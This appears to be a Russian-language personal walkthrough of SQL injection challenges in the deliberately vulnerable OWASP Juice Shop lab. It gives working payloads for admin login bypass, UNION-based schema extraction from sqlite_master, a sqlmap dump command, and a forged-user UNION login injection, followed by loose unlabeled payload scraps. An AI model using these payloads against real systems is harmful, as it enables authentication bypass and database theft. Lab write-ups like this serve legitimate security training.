### Оглавление
[[#Injection]] - SQL и NoSQL инъекции


---
#### Injection

**Login Admin**
аутентификация пользователя происходит при помощи следующей схемы: 
```
SELECT * FROM users WHERE username = 'admin' AND password = 'password'
```
по факту нужно найти почту админа, она будет в отзывах на заказы, 
используем ее и получаем такой запрос `admin@juice-sh.op'-- `
```
SELECT * FROM users WHERE username = 'admin@juice-sh.op'-- ' AND password = 'password'
```
Login Jim и Login **Bender** проходятся аналогично, хотя по факту можно и другими путями 

**Database Schema**
Exfiltrate the entire DB schema definition via SQL Injection.
Выбор сразу пал на глобальный поиск товаров, дальше стал пробовать стандарт
```
' OR 1=1-- 
```
Вызывало 500 и просто ошибку, далее попробовал
```
'%20OR%201=2--
```
закодировал в URL получил 500 но 
```
{
    "error": {
        "message": "SQLITE_ERROR: incomplete input",
        "stack": "Error: SQLITE_ERROR: incomplete input",
        "errno": 1,
        "code": "SQLITE_ERROR",
        "sql": "SELECT * FROM Products WHERE ((name LIKE '%' OR 1=2--%' OR description LIKE '%' OR 1=2--%') AND deletedAt IS NULL) ORDER BY name"
    }
}
```
теперь у нас есть запрос с которым можно работать 
пробовал по разному создавать пространство между командами `/**/` `+`(самым последним), в итоге методом проб и ошибок получил следующее 
```
%'/**/)/**/and/**/1=1)--
```
вывел все продукты, если написать `1=2` не выведет ничего, поэтому я решил упростить читаемость для себя и сделал следующее
```
%'+)+and+1=1)+UNION+SELECT+*,NULL,NULL,NULL,NULL+FROM+sqlite_master-- 
```
добавил UNION и поугадывал количество возвращаемых столбцов, в итоге получил все записи из этой таблицы
**Order the Christmas special offer of 2014.**
Я решал через `sqlmap` 
```
sqlmap -r ss.req --batch --level=5 --risk=3 --ignore-code=401  -D SQLite -T Products  --dump --threads 10 
```
достал id  Christmas special offer of 2014 и после добавил в корзину и закал






        "id": "table",
        "name": "Products",
        "description": "Products",
        "price": 7,
        "deluxePrice": "CREATE TABLE `Products` 
        (`id` INTEGER PRIMARY KEY AUTOINCREMENT,
         `name` VARCHAR(255),
          `description` VARCHAR(255),
           `price` DECIMAL,
           `deluxePrice` DECIMAL,
           `image` VARCHAR(255),
           `createdAt` DATETIME NOT NULL,
           `updatedAt` DATETIME NOT NULL,
           `deletedAt` DATETIME)",
        "image": null,
        "createdAt": null,
        "updatedAt": null,
        "deletedAt": null



SELECT * FROM Users WHERE email = 'admin@juice-sh.op' UNION SELECT 'acc0unt4nt@juice-sh.op',NULL-- ' AND password = '5f4dcc3b5aa765d61d8327deb882cf99' AND deletedAt IS NUL


' UNION SELECT * FROM (SELECT 123 as 'id', 'jopa' as 'username', 'acc0unt4nt@juice-sh.op' as 'email','password' as 'password', 'admin' as 'role','' as 'deluxeToken' , '0.0.0.0' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as isActive,   datetime('now') as 'createdAt', datetime('now') as 'updatedAt', NULL as 'deletedAt')-- 